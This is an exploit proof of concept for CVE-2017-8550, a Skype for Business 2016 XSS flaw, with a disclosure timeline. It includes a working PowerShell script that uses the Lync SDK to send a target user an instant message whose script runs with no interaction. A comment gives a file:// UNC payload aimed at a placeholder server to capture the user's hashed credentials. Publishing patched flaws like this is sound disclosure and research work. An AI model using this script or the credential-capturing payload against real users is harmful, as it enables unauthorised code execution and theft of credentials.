# Exploit Title:  Skype for Business 2016 XSS Injection - CVE-2017-8550
#
# Exploit Author: @nyxgeek - TrustedSec
# Date: 2017-04-10 
# Vendor Homepage: www.microsoft.com
# Versions: 16.0.7830.1018 32-bit & 16.0.7927.1020 64-bit or lower
#
#
# Requirements: Originating machine needs Lync 2013 SDK installed as well as a user logged 
# into the Skype for Business client locally
#
#
# Description:
#
# XSS injection is possible via the Lync 2013 SDK and PowerShell. No user-interaction is 
# required for the XSS to execute on the target machine. It will run regardless of whether 
# or not they accept the message. The target only needs to be online.
#
# Additionally, by forcing a browse to a UNC path via the file URI it is possible to
# capture hashed user credentials for the current user.
# Example: 
# <script>document.location.replace=('file:\\\\server.ip.address\\test.txt');</script>
#
#
# Shoutout to @kfosaaen for providing the base PowerShell code that I recycled
#
#
# Timeline of Disclosure
# ----------------------
# 4/24/2017 Submitted to Microsoft
# 5/09/2017 Received confirmation that they were able to reproduce
# 6/14/2017 Fixed by Microsoft




#target user
$target = "username@domain.com"

# For this example we will force the user to navigate to a page of our choosing (autopwn?)
# Skype uses the default browser for this.

$message = "PoC Skype for Business 2016 XSS Injection<script>document.location.href=('http://www.youtube.com/watch?v=9Rnr70wCQSA')</script>"




if (-not (Get-Module -Name Microsoft.Lync.Model)) 
{
    try 
        {
	    # you may need to change the location of this DLL
            Import-Module "C:\Program Files\Microsoft Office\Office15\LyncSDK\Assemblies\Desktop\Microsoft.Lync.Model.dll" -ErrorAction Stop
        }
    catch 
        {
            Write-Warning "Microsoft.Lync.Model not available, download and install the Lync 2013 SDK http://www.microsoft.com/en-us/download/details.aspx?id=36824"
        }
}

 # Connect to the local Skype process
    try
    {
        $client = [Microsoft.Lync.Model.LyncClient]::GetClient()
    }
    catch
    {
        Write-Host "`nMust be signed-in to Skype"
        break
    }

     #Start Conversation 
    $msg = New-Object "System.Collections.Generic.Dictionary[Microsoft.Lync.Model.Conversation.InstantMessageContentType, String]"

    #Add the Message
    $msg.Add(1,$message)

    # Add the contact URI
    try 
    {
        $contact = $client.ContactManager.GetContactByUri($target) 
    }
    catch
    {
        Write-Host "`nFailed to lookup Contact"$target
        break
    }


    # Create a conversation
    $convo = $client.ConversationManager.AddConversation()
    $convo.AddParticipant($contact) | Out-Null

    # Set the message mode as IM
    $imModality = $convo.Modalities[1]
    # Send the message
    $imModality.BeginSendMessage($msg, $null, $imModality) | Out-Null
    # End the Convo to suppress the UI
    $convo.End() | Out-Null

    Write-Host "Sent the following message to "$target":`n"$message